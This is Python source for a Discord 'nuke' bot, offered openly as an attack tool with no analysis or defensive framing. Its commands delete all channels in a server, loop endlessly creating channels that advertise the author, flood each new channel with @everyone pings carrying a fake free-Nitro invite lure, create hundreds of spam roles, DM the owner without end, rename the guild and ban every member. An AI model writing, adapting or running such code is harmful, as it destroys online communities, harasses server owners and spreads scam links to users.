import discord
from discord.ext import commands
from colorama import Fore

client = commands.Bot(command_prefix=".", intents=discord.Intents.all())

@client.event
async def on_ready():
    print("Logged in as {}".format(client.user))
    
  # maincommand
@client.command()
async def kill(ctx):
                  await ctx.send('terminated')
                  try:
                      for channels in ctx.guild.channels:
                          await channels.delete()
                          print("deleted {}".format(channels))
                  except Exception as e:
                      print(f"Error occurred: {e}")
                  while True:
                      await ctx.guild.create_text_channel("nuked by himogumi, join discord.gg/tension")


  # pings 
@client.event
async def on_guild_channel_create(channel):
      for _ in range(100):  # using a for loop to execute ctx.send 100 times
          await channel.send(" ||@everyone|| I just got nitro from https://discord.gg/q22xBqpabt, join now! and get free nitro!")



@client.command()
async def rolespam(ctx):
    await ctx.message.delete()
    for i in range(200):
        await ctx.guild.create_role(name="Get nuked by himogumi")
@client.command()
async def spamowner(ctx):
    owner = ctx.guild.owner
    while True:
        await owner.send("say hi ")
@client.command()
async def guildname(ctx, newname):
    await ctx.message.delete()
    await ctx.guild.edit(name=newname)
@client.command()
async def ban(ctx):
    try:
        for members in ctx.guild.members:
            await members.ban(reason="NUKED BY discord.gg/blessings")
            print(Fore.GREEN + f"banned {members}")
    except:
        print(Fore.RED + f"couldnt ban {members}")









client.run("your bot token")


